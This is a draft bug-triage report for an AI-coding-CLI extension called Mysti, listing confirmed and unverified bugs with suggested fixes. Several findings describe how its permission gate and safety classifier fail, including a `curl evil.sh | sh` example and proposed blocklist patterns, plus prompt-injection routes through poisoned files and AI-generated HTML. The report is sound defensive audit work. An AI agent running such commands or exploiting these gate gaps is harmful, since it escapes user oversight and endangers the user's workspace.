# Mysti — Consolidated Findings & GitHub Triage

**Date:** 2026-06-12 · **Status:** DRAFT
**Repo state:** branch `feature/visual-testing` (uncommitted Canvas v2 changes); `origin/main` at `bce0d2b` (v0.4.0).
**Sources:** `/tmp/mysti-planning/research/` — `mysti-providers.md`, `mysti-managers-core.md`, `mysti-managers-collab.md`, `mysti-webview-chat.md`, `mysti-canvas-current.md`, `mysti-performance.md`, `github-triage.md`. All confirmed bugs below were adversarially verified against the working tree (and, where noted, against live CLI behavior).
**Sibling plans:** `plans/01-automatic-model-updates.md`, `plans/02-unified-chat-experience.md`, `plans/03-performance-optimization.md`, `plans/05-canvas-overhaul.md` own several remediation batches below — those items are tagged "→ owned by …" in the Remediation Plan and must be executed from the owning plan, not from this file.

---

## Confirmed Bugs

36 confirmed bugs (2 critical, 34 high) after merging duplicates reported independently by multiple research areas (the permission-gate and ProviderManager-routing findings each surfaced twice).

### Critical

| ID | Area | File | Description | Suggested fix |
|---|---|---|---|---|
| B1 | security / chat | `src/utils/permissionClassifier.ts:53` | Permission gate is name-keyed and **fail-open**: `classifyToolAction` returns `'file-read'` (never gated) for any tool name not in the exact-match `WRITE_TOOLS` map, while every CLI provider runs with native permissions bypassed (`--yolo`, `--allow-all-tools`, `--approval-mode auto-edit`, `--force`) and the stream gate is documented as the **sole enforcement point**. Gemini/Qwen pass raw tool names (`write_file`, `replace`, `run_shell_command` — absent from the map, which has near-misses `write_to_file`/`replace_in_file`/`execute_command`), Cursor maps to lowercase `write`/`edit`/`delete`, OpenCode passes lowercase `edit`/`write`, and Copilot emits plain text so `tool_use` chunks never exist. In the default `ask-before-edit` mode, **5 of 12 providers edit files (and Gemini/Qwen also run shell) with zero permission prompt**. `'web-request'` is unreachable — no tool maps to it. (Caveat: Cursor/OpenCode shell maps to `bash` which IS gated.) | 1) Make the gate fail-closed for unknown tool names when mode requires approval (or classify unknowns via `/write\|edit\|patch\|replace\|delete\|shell\|command\|bash\|exec/i`). 2) Require canonical tool-name normalization per provider (Codex already does it) — add to the `ICliProvider` contract: `GeminiProvider.ts:307-347`, `QwenCodeProvider.ts:395-407`, `CursorProvider.ts:288-299`, `OpenCodeProvider.ts:302-317`. 3) Replace the known-write list with a known-read-only allowlist (`Read`, `Grep`, `Glob`, `read_file`, `list_directory`, …). 4) Map `web_fetch`-style tools to `web-request`. |
| B2 | onboarding | `src/providers/ChatViewProvider.ts:413` | Setup wizard runs with `panelId=null`, so **every wizard response is silently dropped**. `_sendInitialState` early-returns with `showWizard` when no provider is ready; `initialState` (the only message setting webview `state.panelId`) never arrives. All wizard messages carry `panelId:null` and every reply (`providerSetupStep`, `setupStatus`, `authOptions`, etc.) goes through `_postToPanel(null)` which no-ops at line 6074. First-run onboarding with no CLI installed — exactly the wizard's audience — appears frozen. | Include `panelId` in the `showWizard` payload and set `state.panelId` in `handleShowWizard` (`webviewContent.ts:13688`); defensively default `msg.panelId ?? 'sidebar'` for sidebar-originated messages in `_handleMessage`. |

### High — Provider layer

| ID | File | Description | Suggested fix |
|---|---|---|---|
| B3 | `src/providers/base/BaseCliProvider.ts:1032` (also `:673`, `:1161`; `ClineProvider.ts:839`; `CopilotProvider.ts:352`; `ProviderManager.ts:292`) | `ChildProcess.killed` misused — **all SIGKILL escalation is dead code**. `.killed` becomes true once `kill()` successfully *sends* a signal, not on exit. Every grace-period force-kill checks `!proc.killed` after `kill('SIGTERM')` already ran, so the SIGKILL branch can never execute. CLIs that ignore SIGTERM leak permanently; cleanup guards like `if (proc && !proc.killed)` (lines 203/297/1018/1157) also skip signaled-but-alive processes, including in `dispose()`. | Central `killProcessTree(proc, grace)` utility using `proc.exitCode === null && proc.signalCode === null` (or an exit-event flag); clear the escalation timer on exit; replace all 6 call sites and fix the `!killed` cleanup guards. |
| B4 | `src/providers/base/BaseCliProvider.ts:852` | Persistent-mode fallback **re-sends the message after cancel or mid-stream failure**. `usedPersistent` is set only from chunk count after the persistent loop completes; cancelling a persistent (Claude) request before output yields zero chunks → falls through to `_sendSingleShot` and re-sends the prompt the user just cancelled. An exception escaping after chunks were yielded likewise silently sends the same message twice — duplicated output, potential double execution of mutating instructions. | Set `usedPersistent = true` as soon as the first chunk is yielded; check a per-session cancellation flag before falling back to single-shot; treat cancel as terminal. |
| B5 | `src/providers/copilot/CopilotProvider.ts:313` | Copilot passes a **fabricated session ID to `--resume`** on every follow-up. The UI-only `copilot-<panel>-<ts>` ID is fed into `buildCliArgs` (line 386). Empirically verified with Copilot CLI 0.0.372: `--resume copilot-…` fails with "Session file is corrupted or incompatible" and returns no response. From message 2 of any Copilot conversation, resume is fiction (history is also re-sent in the prompt). | Never feed locally generated IDs into `--resume`; only use IDs parsed from CLI output (the JSON `init` branch at `:479-485`). Until then, drop `--resume` entirely for Copilot. |
| B6 | `src/providers/copilot/CopilotProvider.ts:453` | Copilot permission gate cannot fire while the CLI is bypassed with `--allow-all-tools`. The provider pushes the flag for ask-level mode/access combos assuming the stream gate handles prompts, but Copilot CLI outputs **plain text** — `parseStreamLine` never emits `tool_use`, so `_shouldGateToolUse` never runs. Copilot executes shell commands and file writes with no approval anywhere when the user chose ask-level permissions. | For ask-tier combinations use deny-by-default (`--deny-tool shell --deny-tool write`) unless mode is edit-automatically + full-access; do not advertise ask-before-edit support for Copilot until JSON output exists. |
| B7 | `src/providers/cline/ClineProvider.ts:908` | Cline can **permanently clobber the user's `.clinerules`** workspace file. `_writeClinerules` backs up into per-panel session state, overwrites the shared file, restores in `finally`. Two concurrent Cline panels: panel B backs up panel A's injected content as the "original" — the user's real file is replaced with Mysti-generated text. Crash/window-close mid-request leaves the overwritten file on disk; `clearSession` nulls the backup without restoring. Data loss in a file often committed to git. | Write instructions to a Mysti-prefixed entry in the `.clinerules/` directory (Cline reads directory rules) instead of overwriting the file; if overwriting must stay, add a global mutex + on-activation restore journal, and restore in `clearSession`. |
| B8 | `src/providers/cursor/CursorProvider.ts:564` | Cursor drops **all conversation context** — follow-ups are stateless. `sendMessage` passes `null` for the conversation to `buildPromptAsync` ("Cursor manages its own context" — it doesn't: each message spawns a fresh one-shot `agent -p`), `supportsSessions` is false, no resume flag is used, yet a fake `session_active` chunk (line 640) makes the UI imply continuity. | Pass conversation history into the prompt (like Cline/Codex) or use Cursor CLI's actual resume mechanism and store the real chat ID; remove the fabricated `session_active`. |
| B9 | `src/providers/qwen/QwenCodeProvider.ts:188` | Qwen `--continue` resumes the **globally most recent session** — cross-panel session bleed. The per-panel sessionId is used only as a boolean to push bare `--continue` (= "resume most recent session for the project"). Two panels — or a terminal `qwen` in the same repo — resume each other's conversations. The CLI supports `--resume <id>` / `--session-id`, which Mysti never uses. | Pass `--resume <session.sessionId>` (the ID is already captured at `:375-389`), matching `ClaudeCodeProvider.ts:242` / `GeminiProvider.ts:203`. |
| B10 | `src/providers/openclaw/OpenClawGateway.ts:303` | OpenClaw Gateway events are **not scoped per request**: `sendAgentMessage` subscribes to global event names (`agent`/`chat`/`stream`/`message`/`response`) with no `runId`/`sessionKey` filtering, so two concurrent gateway runs push deltas into both generators, mixing text between chats. `cancelAgent()` sends `agent.stop` with empty params and is called per panel — one panel's cancel/close stops **every** panel's run. The `runId` is received in the ack and discarded. | Capture `runId` from the ack (`:774-775`), filter events in `_mapEventToChunk` by runId/sessionKey, and scope `agent.stop` to the specific run. |
| B11 | `src/providers/codex/CodexProvider.ts:344` | Codex silently drops `agentConfig`: the `sendMessage` override declares 7 params while `ProviderManager.sendMessage` passes 9, and the deprecated sync `buildPrompt` (`:295-336`) has no agent-instruction support — the entire persona/skill system is a no-op on Codex with no warning. (Caveat: the attachments half is handled upstream — `ChatViewProvider.ts:2694-2717` strips them with a visible warning before sendMessage.) | Extend the override signature to the full parameter list; switch to `buildPromptAsync`; delete the deprecated sync `buildPrompt` so this class of drift can't recur. |

### High — Core managers / security enforcement

| ID | File | Description | Suggested fix |
|---|---|---|---|
| B12 | `src/managers/ProviderManager.ts:228` | `cancelRequest`/`suspendRequest`/`resumeRequest`/`clearSession`/`disposePersistentProcess` route to the **global default provider**, not the panel's provider (per-panel overrides + @-mention routing exist). Consequences: the permission gate's SIGSTOP (`ChatViewProvider.ts:2877`) no-ops when the panel runs a non-default provider — the CLI keeps running while the permission card is shown; on denial, cancel no-ops on the wrong provider and the tracked `ChildProcess` handle is deleted without killing (line 242); brainstorm cancel kills at most one of two agents; MentionRouter sub-agent timeout cancels never reach non-default providers (orphans run until the 5-min timeout). (Caveat: the generator `finally` eventually kills the process — but only after the denied tool had the whole decision window to run.) | Thread the panel's provider id into all panel-scoped operations (callers know `settings.provider` / `_getPanelProvider`), or iterate all registered providers (they no-op when they own nothing for the panel); record `panelId → providerId` at `registerProcess`; SIGKILL the tracked `_activePanelProcesses` handle as a backstop before deleting it. |
| B13 | `src/providers/ChatViewProvider.ts:3147` | Autonomous continuations force `mode='edit-automatically'` + `accessLevel='full-access'`, so `shouldGateToolUse` returns false for everything, CLIs select their full bypass flags (`--dangerously-skip-permissions`, `--dangerously-bypass-approvals-and-sandbox`), and SafetyClassifier — reachable only via the gated permission path — **never evaluates its hard blocks (rm -rf, sudo, force-push, DB drops) after the first autonomous turn**. Contradicts package.json's advertised "destructive operations always blocked in autonomous mode". | Keep the gate active during autonomous sessions regardless of settings: gate every write/bash `tool_use`, route through SafetyClassifier, auto-approve `safe`, block `blocked` — instead of disabling the gate via settings. |
| B14 | `src/managers/SafetyClassifier.ts:56` | Safe-list matches only the **command prefix**: `ls && curl evil.sh \| sh`, `npx any-package` (arbitrary code execution), `find . -delete`, `echo x > file` all classify safe → auto-approve in every safety mode including conservative. Plain `rm file` is neither blocked nor safe-listed → auto-approved in aggressive mode, despite the file-deletion-always-blocked policy. | Reject compound commands (`;`, `&&`, `\|\|`, `\|`, `>`/`>>`, backticks, `$(`) before applying safe patterns (or tokenize and validate each segment); remove `npx`/bare `echo`/`find` from the safe list; add `find … -delete/-exec`, `\brm\b` (any form), and pipe-to-shell to the blocklist. |
| B15 | `src/providers/ChatViewProvider.ts:4013` | Permission-decision learning is **dead**: `handleResponse()` deletes the pending request before `getPendingRequest()` is called, so it always returns undefined and `learnFromPermissionDecision` never runs for real user decisions. The only writer is the semi-autonomous timeout path, which records the **AI's own decisions** as user preferences — a self-reinforcing loop with zero human signal. | Read the request before `handleResponse` (or have `handleResponse` return the resolved request). One-line reorder. |
| B16 | `src/managers/AgentLifecycleManager.ts:302` | Child-process protection is **inert**: `registerProcessPid` has zero callers, so `lastKnownPid` is always null and `trackedChildPids` always empty — `processTreeTracking`/`protectActiveChildren` settings can never block an idle shutdown. Independently, `_scanChildren` computes `hadChildren` AFTER replacing the set, making `children-detected`/`children-cleared` events mathematically unreachable. | Call `registerProcessPid(panelId, proc.pid)` from `ProviderManager.registerProcess` (which already receives the ChildProcess); snapshot `hadChildren` before replacing the set. |

### High — Collaboration / channels / memory (GitHub issues #42 / #44 / #46)

| ID | File | Description | Suggested fix |
|---|---|---|---|
| B17 | `src/managers/ChannelBridge.ts:880` | **Cross-channel identity confusion (issue #42 confirmed):** `_isTrackedConversation` ignores its channel parameter; contacts are keyed only by normalized name/phone with **bidirectional substring matching**. Messaging "John" on WhatsApp authorizes inbound from any "John" on any channel. Authorized inbound text can answer pending questions, cancel runs, or inject a new agent run. | Merge **PR #43** (channel-scoped contact keys `id:<channelId>\|<identifier>`, channel-enforced matching, `_matchesInboundChannel`). |
| B18 | `src/managers/ChannelBridge.ts:783` | **Pending ask replies mis-bound across panels (issue #44 confirmed):** `_tryMatchPendingAsk` falls back to `channelAsks[0]` inside the FIRST panel with any pending ask — a sender-aware match in a later panel is never reached. Bob's reply binds to Alice's ask and auto-triggers the wrong panel's agent with third-party text. Sender matching routinely fails (ask.to is a name; `conversation_label` is often E.164), making the misbinding fallback the common path; `askId`/`panelId` exist but are never used for correlation. | Merge **PR #45 rebased onto #43** (cross-panel candidate collection, exactly-one-candidate requirement, ambiguous replies dropped). |
| B19 | `src/managers/MemoryManager.ts:284` | **Project memory keyed by literal workspace path (issue #46 confirmed):** sha256 of the raw `workspaceFolders[0].uri.fsPath` string, 12 hex chars, no realpath canonicalization. Different real projects at the same lexical path (recycled dirs, `/tmp`, devcontainer mounts) share `MEMORY.md` — injected into provider context by default → context leak/poisoning; the same project via a symlink gets amnesia. (Bug is in MemoryManager, not ProjectContextManager.) | Merge **PR #47** (realpath canonicalization + full-hash v2 scheme) **plus add a one-time migration** of existing `~/.mysti/projects/<12-char>/memory` dirs — the PR silently orphans all existing project memory. |

### High — Chat webview / message routing

| ID | File | Description | Suggested fix |
|---|---|---|---|
| B20 | `src/providers/ChatViewProvider.ts:3045` | Cancelled/denied responses are **never persisted** — the assistant message is saved only inside the `done` case. The cancel break (2790), permission-deny return (2914), and catch (3181) all skip persistence while the webview has already rendered the text; it vanishes on reload/conversation switch. (Caveat: CLI non-zero exits yield `error` then `done`, so that subcase persists; only thrown exceptions skip.) | Persist accumulated `assistantContent`/`thinkingContent` in a `finally` (flagged as interrupted) and post `responseComplete`/`requestCancelled` so the webview finalizes the bubble. |
| B21 | `src/providers/ChatViewProvider.ts:2782` | `_runningPanels`/lifecycle busy **leak on every non-done exit**; `cancelRequest` (630-648) never cleans up, never calls `markIdle`, never clears `_pendingAskUserQuestions`/`_semiAutoQuestionTimeouts`. ChannelBridge.isRunning reports stale true (queued messages never injected), every next send takes the cancel-previous path, and semi-autonomous question timers fire **after cancel**, auto-answering a dead question and re-launching the agent (4073-4124). | Wrap the stream loop in `try/finally { _runningPanels.delete(panelId); _lifecycleManager.markIdle(panelId); }`; clear pending-question state and timers in the cancel handler. |
| B22 | `src/webview/webviewContent.ts:18376` | Unsanitized `marked.parse` (marked v15, no built-in sanitizer, no DOMPurify) assigned via `innerHTML` for all assistant/sub-agent text. CSP blocks scripts but allows `unsafe-inline` styles and `data:` images, so model output (steerable via poisoned files/web content read by tools) can inject `<style>` blocks and markup to render **fake permission cards** or restyle real Approve/Deny buttons. The permission card itself renders `details.filePath` unescaped (`:16221`). | Bundle DOMPurify into `resources/` and sanitize all marked output; escape `filePath` (16221) and `item.path` title attrs (15304); consider dropping `'unsafe-inline'` for styles. |
| B23 | `src/providers/ChatViewProvider.ts:2344` | New message in one panel **force-denies pending permissions in all panels**: `permissionManager.cancelAllRequests()` iterates every pending request across panels while `permissionDismissed` cleanup is posted only to the sending panel. The victim panel's stream is cancelled with a spurious "Operation denied" error while its card still looks pending. | Key permission requests by panelId; add `cancelRequestsForPanel(panelId)` and use it in the supersede path. |
| B24 | `src/providers/claude/ClaudeCodeProvider.ts:489` | Claude `exit_plan_mode` chunk is produced but **consumed nowhere** — no case in the `_handleSendMessage` switch, no webview handler (only the type union references it). In plan modes the plan-approval moment and `planFilePath` are silently swallowed, and the "running" ExitPlanMode tool card is left stuck. | Handle `exit_plan_mode` in `_handleSendMessage` (route into PlanOptionManager / plan-selection UI, complete the tool card) or stop intercepting the tool in the provider. |
| B25 | `src/webview/webviewContent.ts:15680` | **Severe per-provider UX divergence**: webview hard-codes provider ids instead of capabilities — thinking render style forks only on `'openai-codex'`; thinking selector hidden only for Gemini though 6 providers ignore it; session indicator never appears for Ollama/LocalAI/Manus; context bar/compaction dead for Manus; Copilot has no tool cards or gate; Cline shows the real answer only at `completion_result`; Cursor shows rejected tools as completed (`CursorProvider.ts:475-489`). (Caveats from verification: OpenClaw DOES yield usage in `done`; Ollama/LocalAI never send `tools` so the eternal-spinner path is latent.) Full matrix in `mysti-webview-chat.md` §4. | Capability-driven UI: extend `ProviderCapabilities` with `thinkingStyle`, `emitsToolEvents`, `emitsUsage`, `sessionKind`; post a provider manifest to the webview; define a canonical StreamChunk contract with per-provider conformance tests (design in `unified-chat-ux.md`). Fix Cursor's rejected→completed mapping directly. |

### High — Canvas v2

| ID | File | Description | Suggested fix |
|---|---|---|---|
| B26 | `src/webview/canvasContent.ts:3943` | Region/full snapshots **mis-cropped whenever panned or zoomed**: `buildSnapshot()` passes world-space bounds to `canvas.toDataURL`, but bundled fabric v6 `toCanvasElement` interprets left/top as viewport-space and keeps current zoom. Every AI reference image (smart prompts, `/v1/images/edits`, `/svg`, `/code`) shows the wrong region in the normal panned/zoomed state; "full" capture is just the visible viewport. | Convert world→screen before cropping (`left: cropLeft*zoom + vpt[4]`, …, `width: cropW*zoom`) with `multiplier: 1/zoom`, or temporarily reset `viewportTransform` to identity around the export. |
| B27 | `src/webview/canvasContent.ts:2554` | Undo/redo passes a **fabric v5 completion callback that v6 treats as a per-object reviver** — runs once per object mid-load (re-entrant `object:added` pollutes the undo stack) and never runs for an empty restore, leaving `isUndoRedoing=true` forever → autosave and all history snapshots permanently suppressed until reload. Session-load path already uses `.then()` correctly. | `canvas.loadFromJSON(state).then(() => { …; isUndoRedoing = false; })` in both `undo()` (2554) and `redo()` (2579). |
| B28 | `src/webview/canvasContent.ts:3606` | Typed `/edit`, `/variants`, `/html`, `/design-dna` **always fail**: `sendUnifiedPrompt()` never includes `stitchScreenRef`, while the extension handlers (`ChatViewProvider.ts:5645/5668/5698/5721`) hard-require it and error "Select a Stitch-generated screen" — even with one selected. Only the action-reimagine button attaches the ref. Four advertised slash commands are dead from the prompt bar. | Include `stitchScreenRef: canvas.getActiveObject()?._stitchScreenRef \|\| null` in `sendUnifiedPrompt`; add an extension-side fallback derived from snapshot metadata like `canvasReimagine` does (`:5151-5157`). |
| B29 | `src/webview/canvasContent.ts:3586` | Prompt-bar Stitch/render jobs **leak permanent "Generating…" spinner overlays**: `genJobCreate` fires for every non-prompt action, but `design`/`stitch-edit`/`stitch-variants`/`stitch-html`/`design-dna`/`render` are never assigned to tracked `_pending*Job` slots (webview action names diverge from `CanvasManager.parseUnifiedPrompt` — `/design` maps to `'page'` extension-side). Completion and `canvas_error` cleanup only complete tracked slots; the overlay obscures the frame until reload. | Unify action-type naming with `parseUnifiedPrompt`; key jobs by a correlation/job id echoed in every chunk; sweep/clear all `_genJobs` on `canvas_error`. |
| B30 | `src/services/ImageGenerationService.ts:138` | OpenAI vision fallback **always 400s**: sends `max_tokens` to `gpt-5-mini` (gpt-5 family requires `max_completion_tokens`). Users with only an OpenAI key cannot use `/svg`, `/code`, element editing, prop regeneration, or vision profiling, though `isVisionAvailable` reports true. | Replace `max_tokens` with `max_completion_tokens` (or move to the Responses API). One-line fix. |
| B31 | `src/webview/canvasContent.ts:5346` | Generated/Stitch HTML iframes run **same-origin with the webview** (`sandbox="allow-scripts allow-same-origin"` + blob: URLs + React/Babel from unpkg). Any JS in AI/Stitch-generated HTML (or a compromised CDN bundle) can reach `window.parent` and drive the parent UI handlers that post `canvasUpdateProps` (workspace file writes), `canvasIntegrateComponent` (drives the coding agent), `canvasSaveConfig` (overwrites API-key settings) — a prompt-injection→workspace-write escalation path. | Drop `allow-same-origin`: use `srcdoc` + `postMessage` with an explicit `MessageChannel` (the bridge already uses postMessage; replace the `document.write` reload with iframe recreation). Bundle React/Babel locally under `resources/` instead of unpkg. |
| B32 | `src/webview/canvasContent.ts:4569` | "Apply props" **regenerates components from an empty SVG**: `btn-props-apply` hardcodes `svgMarkup:''`, and `CodeGenerationService.regenerateWithProps` embeds that empty SVG as the only design source (current component code never included). The model regenerates from just the prop list and the result overwrites the existing files — users editing props get code unrelated to their design. | Send `vd.svgMarkup`/`vd.codeFiles[0].content` from the webview (store SVG in `showPropsPanel`); include the current component code in the regeneration prompt. |

### High — Performance

| ID | File | Description | Suggested fix |
|---|---|---|---|
| B33 | `src/webview/webviewContent.ts:15631` | Streaming renders **full markdown + whole-document Prism re-highlight on every token delta**, unthrottled. Claude runs with `--include-partial-messages`; each delta triggers postMessage, `JSON.stringify`+`console.log`, full-text regex, `marked.parse` of the entire segment, full innerHTML swap, document-wide `Prism.highlightAll()`, mermaid scan, forced-layout scroll. O(n²) per response, grows with conversation length — visible jank/CPU spikes. The sub-agent path already has the correct 200ms-throttle + `highlightAllUnder` pattern (`:9772-9791`). | Throttle main-path renders to 100-200ms (copy the sub-agent pattern); `Prism.highlightAllUnder(segmentEl)`; mermaid only in `finalizeStreamingMessage`; drop per-chunk console logs; optionally coalesce deltas 30-50ms on the extension side before `_postToPanel`. |
| B34 | `src/managers/SetupManager.ts:900` | Sidebar/tab open **blocks on serial discovery+auth probing of all 11 providers, no cache**: `_sendInitialState` awaits `getWizardStatus()` on every resolve; Ollama/LocalAI do HTTP fetches with 3s timeouts in both calls; the "Preparing your workspace…" overlay stays up the whole time (worst case ~6s+). A second full serial loop runs before `initialState` is posted (`ChatViewProvider.ts:517-526`). | Probe in parallel (`Promise.all`); cache discovery/auth with a TTL (invalidate on settings change/wizard action); probe only the active provider for initial state; extract one shared `CliDiscoveryService` used by registry, SetupManager and wizard. |
| B35 | `src/extension.ts:82` | Extension activation **blocks on serial initialization of 11 providers** before registering the webview or any command — sync `readdirSync` over nvm dirs, `accessSync` over 10-15 paths, `which` spawns, 3s-timeout HTTP fetches; results are unused (only logged). Broad `activationEvents` (`workspaceContains:.claude/**` etc.) make Mysti activate eagerly in most AI-assisted repos at editor startup. | Register webview/commands first; run `initializeAll` in the background with `Promise.allSettled` (or drop eager discovery — SetupManager re-discovers on demand); narrow `workspaceContains` triggers to exact files. |
| B36 | `src/webview/webviewContent.ts:28` + `resources/icons/` | **30.7MB of decorative PNG icons** (22 files, 1024×1024 at ~1.4MB each, rendered at 16-28px): ~93% of the 33.8MB VSIX, and ~30MB of fetch+decode on every webview startup (welcome + persona cards render unconditionally). | Downscale to ≤64px or convert to SVG. Expected: icons ~100-300KB, VSIX ~3MB, visibly faster first paint. |

### Investigated, not a bug

| Claim | Verdict |
|---|---|
| "Autonomous 4h timeout broken on 5 providers — killed at 5 minutes" (`session.autonomousMode` unset in the 5 overriding providers) | **Refuted.** The mechanism is accurate, but the impact is unreachable: all `waitForProcess` call sites run only after the stdout stream is consumed to EOF, and no other timer exists during streaming — so the 5min-vs-4h timer only bounds the post-EOF wait for process exit (normally instantaneous). Worst case is a spurious timeout error for a process lingering after its output stream closed. Benign latent inconsistency; fix opportunistically when extracting the shared spawn harness (Batch 2.1). |

---

## Reported Findings Needing Confirmation

Medium/low-severity findings from the research reports that were **not** adversarially verified. Treat as a triage queue: confirm each before fixing. Full evidence/fix sketches in the corresponding research files.

### Providers (`mysti-providers.md`)

| Sev | Title | File |
|---|---|---|
| M | Five providers attach no early spawn `error` listener — ENOENT raises an unhandled error event | `src/providers/codex/CodexProvider.ts:385` |
| M | Codex `finally` never kills the process — orphaned CLI on early generator exit | `src/providers/codex/CodexProvider.ts:421` |
| M | `_readUntilBoundary` can hang indefinitely after cancelling a persistent request | `src/providers/base/BaseCliProvider.ts:476` |
| M | Qwen emits `tool_use` from `assistant` events — the double-gating bug Claude's parser explicitly avoids | `src/providers/qwen/QwenCodeProvider.ts:396` |
| M | ManusProvider is unreachable dead code while docs claim 12 backends; poll loop has no cap | `src/providers/manus/ManusProvider.ts:48` |
| M | Windows: npm `.cmd` shims fail to spawn for Codex/Cline/Cursor/OpenClaw (no shell auto-enable) | `src/providers/codex/CodexProvider.ts:382` |
| M | Model selection is a silent no-op for Cline, OpenClaw, and the Ollama/LocalAI dropdowns | `src/providers/cline/ClineProvider.ts:315` |
| M | Cursor/OpenClaw parsers emit their own `done` chunk — double done per response | `src/providers/cursor/CursorProvider.ts:524` |
| M | Capabilities flags contradict reality (Copilot toolUse, Ollama images, Codex/Cline sessions) | `src/providers/ollama/OllamaProvider.ts:92` |
| M | Codex stream-parse defects: false 'failed' status, swallowed errors, no auth detection, dead instance state | `src/providers/codex/CodexProvider.ts:716` |
| M | Prompt as single argv element in Copilot/Cursor/OpenClaw — arg-length limits; Cursor leaks API key via argv | `src/providers/copilot/CopilotProvider.ts:273` |
| M | Cline ask-handling termination is unreachable while the CLI waits for input | `src/providers/cline/ClineProvider.ts:811` |
| L | Attachment temp-file cleanup skipped on early exit in persistent path | `src/providers/base/BaseCliProvider.ts:655` |
| L | Mid-line stream death renders raw JSON fragments as chat text | `src/providers/claude/ClaudeCodeProvider.ts:631` |
| L | Gemini auth checks internally inconsistent; OAuth users may be reported unauthenticated | `src/providers/gemini/GeminiProvider.ts:142` |
| L | `enhancePrompt` implementations lack timeouts, use copy-pasted flags | `src/providers/cline/ClineProvider.ts:863` |
| L | Global cancel doesn't abort HTTP providers; Gateway disconnect strands pending requests | `src/providers/ollama/OllamaProvider.ts:331` |

### Core managers (`mysti-managers-core.md`)

| Sev | Title | File |
|---|---|---|
| M | "Always allow" upgrades one shared session access level across all panels/providers | `src/managers/PermissionManager.ts:169` |
| M | Autonomous memory matching over-generalizes one approval to the entire action type | `src/managers/AutonomousManager.ts:193` |
| M | MemoryManager compounding confidence decay + broken dirty-flag protocol | `src/managers/MemoryManager.ts:541` |
| M | Compaction fill math omits `cache_creation_input_tokens`; usage skipped on compacting turns | `src/managers/CompactionManager.ts:94` |
| M | Client-side summarization can silently drop messages sent during background compaction | `src/managers/CompactionManager.ts:256` |
| M | `switchConversation` never persists; unbounded globalState growth with full file contents per message | `src/managers/ConversationManager.ts:71` |
| M | Context bucket mismatch: Explorer commands write `'default'`, panels read `'sidebar'`/panel ids | `src/extension.ts:317` |
| L | SetupManager stores Cursor API key in plaintext settings, forces /bin/bash auth terminals | `src/managers/SetupManager.ts:723` |
| L | Telemetry enablement sampled once; `sendError` forwards messages that may contain file paths | `src/managers/TelemetryManager.ts:50` |

### Collaboration managers (`mysti-managers-collab.md`)

| Sev | Title | File |
|---|---|---|
| M | `BrainstormManager.cancelSession` cancels panel keys no provider registers | `src/managers/BrainstormManager.ts:1732` |
| M | Brainstorm silence-timeout leaks a timer per chunk, never cancels the orphaned stream | `src/managers/BrainstormManager.ts:838` |
| M | `startBrainstormSession` error path omits `done`, leaves session phase active | `src/managers/BrainstormManager.ts:330` |
| M | Delphi convergence compares refinements against the facilitator summary round | `src/managers/BrainstormManager.ts:1564` |
| M | Unvalidated AI task-list agent ids silently route mention tasks to claude-code | `src/managers/MentionRouter.ts:356` |
| M | Informational @-mention questions lose their subject when routed to the main provider | `src/managers/MentionRouter.ts:255` |
| M | `cancelSubAgents` misses retry/follow-up/taskgen sub-agent processes | `src/managers/MentionRouter.ts:213` |
| M | `/clear` switches the global current conversation under all panels | `src/managers/SlashCommandManager.ts:227` |
| M | Inbound poll watermark drops messages written during a poll | `src/managers/ChannelBridge.ts:592` |
| M | Name/phone identity asymmetry silently drops legitimate ask replies | `src/managers/ChannelBridge.ts:893` |
| M | Always-on warm claude CLI pools; content sent to Claude regardless of selected provider | `src/managers/ResponseClassifier.ts:49` |
| M | Duplicate agent ids across tiers: inconsistent dedup, cross-type clobbering | `src/managers/AgentLoader.ts:129` |
| L | Brainstorm legacy settings shims are dead code (package.json defaults) | `src/managers/BrainstormManager.ts:126` |
| L | Ask replies arriving while the agent runs are never auto-surfaced | `src/managers/ChannelBridge.ts:707` |
| L | Channel prompt snippet cache never refreshes the skills list | `src/managers/ChannelBridge.ts:178` |
| L | Non-greedy JSON extraction truncates AI task lists containing `]` | `src/managers/MentionRouter.ts:344` |
| L | AutocompleteManager is dead code; misc small bugs in classifier/suggestions | `src/managers/AutocompleteManager.ts:32` |
| L | AgentLoader section extraction and matching fragility | `src/managers/AgentLoader.ts:447` |
| L | ProjectContextManager glob matcher escapes only dots; UTC streaks in EngagementManager | `src/managers/ProjectContextManager.ts:480` |

### Chat webview (`mysti-webview-chat.md`)

| Sev | Title | File |
|---|---|---|
| M | Queued channel messages all fire at the same 500ms delay and cancel each other; `_runningPanels` set too late allows concurrent streams | `src/providers/ChatViewProvider.ts:3086` |
| M | Tab dispose clears every panel's plan timers, misses question-state cleanup; sidebar has no dispose handling at all | `src/providers/ChatViewProvider.ts:6054` |
| M | Conversation restore loses tool cards, segments, model attribution | `src/webview/webviewContent.ts:15551` |
| M | Codex bold-text heuristic misroutes answers into thinking; Qwen drops all but first tool_use per message | `src/providers/codex/CodexProvider.ts:632` |
| M | Permission gate suspend race and Windows gap; empty-input tool calls skip gating | `src/providers/ChatViewProvider.ts:2870` |

### Canvas (`mysti-canvas-current.md`)

| Sev | Title | File |
|---|---|---|
| M | Veo: snapped duration computed but raw value sent; video download carries no API key | `src/services/VideoGenerationService.ts:248` |
| M | API keys in plaintext, sync-able settings; Stitch key copied into `process.env` | `src/services/ImageGenerationService.ts:405` |
| M | Canvas wire protocol carries multiple dead pipelines (batch generation unreachable) | `src/webview/canvasContent.ts:6254` |
| M | DesignSpec, Stitch refs, overlay state not persisted — reload degrades designs to inert rects | `src/webview/canvasContent.ts:2528` |
| M | First undo is a no-op (history stores post-change snapshots) | `src/webview/canvasContent.ts:2530` |
| M | Text tool places annotations at viewport coordinates instead of scene coordinates | `src/webview/canvasContent.ts:2188` |
| M | Visual test report stats structurally wrong: issues can never be 'fixed', 'partial' verdict unreachable | `src/managers/VisualTestManager.ts:297` |
| M | Frame-targeted image/video placement ignores object scale | `src/webview/canvasContent.ts:4146` |
| M | Theme tab Generate button dead (`window.prompt` + undefined `vscode`); `/design-dna` silently overwrites DESIGN.md; Stitch variants placed at origin | `src/webview/canvasContent.ts:5051` |
| M | Canvas open race: explicit sessionId load races webview `canvasReady` latest-session load | `src/providers/ChatViewProvider.ts:5077` |
| L | Lifecycle gaps: concurrent canvas AI calls share the `'default'` provider session; StitchService never disposed; capture-dir race; unbounded redirects; 120s video poll cap | `src/managers/CanvasManager.ts:480` |

### Performance (`mysti-performance.md`)

| Sev | Title | File |
|---|---|---|
| M | Entire conversation store rewritten to globalState per message; messages embed full file contents; unbounded growth | `src/managers/ConversationManager.ts:613` |
| M | Per-delta regex scans of the full accumulated response on the extension host | `src/providers/ChatViewProvider.ts:2828` |
